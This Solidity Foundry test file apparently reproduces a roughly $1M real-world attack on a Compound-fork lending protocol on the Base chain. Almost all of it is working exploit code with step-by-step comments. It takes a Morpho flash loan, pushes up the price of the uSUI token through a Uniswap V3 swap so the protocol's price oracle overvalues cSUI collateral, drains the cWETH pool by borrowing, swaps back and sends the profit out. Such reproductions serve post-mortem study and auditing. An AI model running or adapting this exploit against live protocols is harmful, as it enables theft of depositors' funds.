// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : $1M
// Attacker : https://basescan.org/address/0x81d5187c8346073b648f2d44b9e269509513aae2
// Attack Contract : https://basescan.org/address/0x7562846468089cf0e8f7b38ac53406b895284901
// Vulnerable Contract : https://basescan.org/address/0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a
// Attack Tx : https://basescan.org/tx/0x6ab5b7b51f780e8c6c5ddaf65e9badb868811a95c1fd64e86435283074d3149e

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

WETH constant weth = WETH(payable(address(0x4200000000000000000000000000000000000006)));
address constant cWETH = address(0x5c52649d3c1E1d0ddF6a46e1C25A25D9fb148aF8);
address constant uSUI = address(0xb0505e5a99abd03d94a1169e638B78EDfEd26ea4);
address constant cSUI = address(0xA2092F9A2a5dD84D6DF7d175673eC8A7357C551B);
address constant pitfalls = address(0x93D619623abc60A22Ee71a15dB62EedE3EF4dD5a);
address constant UniswapV3Router = address(0xBE6D8f0d05cC4be24d5167a3eF062215bE6D18a5);

struct ExactInputSingleParams {
    address tokenIn;
    address tokenOut;
    int24 tickSpacing;
    address recipient;
    uint256 deadline;
    uint256 amountIn;
    uint256 amountOutMinimum;
    uint160 sqrtPriceLimitX96;
}

contract CompoundFork is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 21_512_062;

    fallback() external payable {}

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(weth);
    }

    function testExploit() public balanceLog {
        // A reproduction for a unknown attack in base chain.
        // 0x6ab5b7b51f780e8c6c5ddaf65e9badb868811a95c1fd64e86435283074d3149e
        // https://app.blocksec.com/explorer/tx/base/0x6ab5b7b51f780e8c6c5ddaf65e9badb868811a95c1fd64e86435283074d3149e?line=6
        // https://x.com/Phalcon_xyz/status/1849636437349527725

        EXPLOIT_DO3 it = new EXPLOIT_DO3();

        it.doTask();
    }
}

contract EXPLOIT_DO3 {
    fallback() external payable {}

    function doTask() public payable {
        Flashable(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb)).flashLoan(address(weth), 800 ether, "");
        // console.log("baaa1: %e", weth.balanceOf(address(this)));

        weth.transfer(address(msg.sender), weth.balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        // bytes32 data = bytes32(uint256(0));
        // MintWithPermitable(address(0x5c52649d3c1E1d0ddF6a46e1C25A25D9fb148aF8)).mintWithPermit(1 ether, data);
        weth.approve(cWETH, type(uint256).max);

        address(0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3).call(
            abi.encodeWithSelector(0x38edc837, address(this), true)
        );

        Mintable(cWETH).mint(15 ether);

        {
            address[] memory s = new address[](1);
            s[0] = cSUI;
            IMarketM(address(0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3)).enterMarkets(s);
        }

        Borrowable(cSUI).borrow(IERC20(uSUI).balanceOf(address(cSUI)));
        // Now I have all the uSUI.

        Helper helper = new Helper();

        {
            weth.transfer(address(helper), weth.balanceOf(address(this)));
            IERC20(uSUI).transfer(address(helper), IERC20(uSUI).balanceOf(address(this)));
        }

        helper.d(address(this));
        // console.log("baaa0: %e", weth.balanceOf(address(this)));

        weth.approve(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb), type(uint256).max);
    }
}

contract Helper {
    fallback() external payable {}

    function d(
        address self
    ) external {
        address(0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3).call(
            abi.encodeWithSelector(0x38edc837, address(this), true)
        );

        weth.approve(UniswapV3Router, type(uint256).max);
        IUniswapV3Router(UniswapV3Router).exactInputSingle(
            ExactInputSingleParams(address(weth), uSUI, 200, address(this), block.timestamp, 500 ether, 1, 1000 ether)
        );

        // As you can see, this protocol thinks that the price of uSUI goes extremely valuable.
        IUnderlyingPrice(pitfalls).getUnderlyingPrice(cSUI);

        // So we deposit uSUI into the protocol to mint some cSUI.
        IERC20(uSUI).approve(cSUI, type(uint256).max);
        Mintable(cSUI).mint(50 ether);

        // Now we can verify we are extremely rich in this protocol, but it is still fake money.
        IMarketM(0xf91d26405fB5e489B7c4bbC11b9a5402aE9243D3).getAccountLiquidity(address(this));

        // Then we can borrow anything we want,
        // console.log("b0: %e", weth.balanceOf(cWETH));
        Borrowable(cWETH).borrow(weth.balanceOf(cWETH));
        // console.log("b0: %e", weth.balanceOf(cWETH));

        IERC20(uSUI).approve(UniswapV3Router, type(uint256).max);

        IUniswapV3Router(UniswapV3Router).exactInputSingle(
            ExactInputSingleParams(
                uSUI, address(weth), 200, address(this), block.timestamp, IERC20(uSUI).balanceOf(address(this)), 1, 0
            )
        );

        weth.transfer(self, weth.balanceOf(address(this)));

        selfdestruct(payable(address(self)));
    }
}

interface IUniswapV3Router {
    function exactInputSingle(
        ExactInputSingleParams calldata data
    ) external;
}

interface IUnderlyingPrice {
    function getUnderlyingPrice(
        address t
    ) external returns (uint256);
}

interface IMarketM {
    function enterMarkets(
        address[] memory
    ) external;
    function getAccountLiquidity(
        address t
    ) external returns (uint256, uint256);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface WETH {
    event Approval(address indexed src, address indexed guy, uint256 wad);
    event Deposit(address indexed dst, uint256 wad);
    event Transfer(address indexed src, address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);

    fallback() external payable;

    function allowance(address, address) external view returns (uint256);
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(
        address
    ) external view returns (uint256);
    function decimals() external view returns (uint8);
    function deposit() external payable;
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function transfer(address dst, uint256 wad) external returns (bool);
    function transferFrom(address src, address dst, uint256 wad) external returns (bool);
    function withdraw(
        uint256 wad
    ) external;
}

interface Flashable {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface MintWithPermitable {
    function mintWithPermit(uint256 mintAmount, bytes calldata signature) external;
}

interface Mintable {
    function mint(
        uint256 a
    ) external;
}

interface Borrowable {
    function borrow(
        uint256 b
    ) external;
}
